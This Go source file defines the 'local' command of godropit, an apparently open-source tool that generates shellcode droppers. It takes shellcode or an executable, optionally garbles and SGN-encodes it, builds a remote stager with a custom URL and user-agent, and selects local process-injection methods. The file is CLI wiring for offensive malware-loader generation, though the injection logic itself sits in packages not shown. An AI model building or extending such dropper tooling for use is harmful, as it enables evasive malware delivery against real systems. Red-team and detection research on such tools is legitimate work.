/*
Copyright © 2023 Phil Kopp
*/
package cmd

import (
	"log"
	"strings"
	"time"

	"github.com/kopp0ut/godropit/internal/godroplib/local"
	"github.com/kopp0ut/godropit/pkg/gengo"

	"github.com/spf13/cobra"
)

var loop bool

// localCmd represents the local command
var localCmd = &cobra.Command{
	Use:   "local",
	Short: "Execute in the local process",
	Long:  `Executes in the local process, if running as an exe I'd recommend using -loop to hold the process open indefinitely.`,
	Run: func(cmd *cobra.Command, args []string) {
		checkImg()
		if input == "" {
			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
		}
		if prestamp {
			name = time.Now().UTC().Format("010206_1504") + "_" + name
		}

		gengo.Garble = garble
		var localDrop gengo.Dropper
		localDrop.Delay = timer
		localDrop.Arch = arch
		localDrop.Shared = shared
		localDrop.Debug = debug

		if loop {
			localDrop.Hold = local.Hold
		} else {
			localDrop.Hold = ""
		}

		shellcode := gengo.NewShellcode(&localDrop, input, output, name, sgn)

		if stagerurl != "" {
			gengo.NewStager(&localDrop, shellcode, stagerurl, imgpath, hostname, ua, name, output)

		}

		if len(methods) >= 1 {
			for i := range methods {
				localDrop.Debug = true
				method := methods[i]
				localDrop.Dlls, localDrop.Inject, localDrop.Import, localDrop.Extra = local.SelectLocal(strings.ToLower(method))
				methodname := name + "_" + method
				gengo.NewDropper(localDrop, methodname, domain, input, output)
			}
		} else {
			localDrop.Dlls, localDrop.Inject, localDrop.Import, localDrop.Extra = local.SelectLocal("")

			gengo.NewDropper(localDrop, name, domain, input, output)
		}
	},
}

func init() {
	newCmd.AddCommand(localCmd)

	localCmd.MarkFlagRequired("in")
	localCmd.MarkFlagRequired("name")
	localCmd.MarkFlagRequired("out")

	// local specific flags
	localCmd.Flags().BoolVarP(&loop, "loop", "l", false, "Add a for loop to keep the process alive. Warning: Will potentially keep process alive even if shellcode fails.")
}
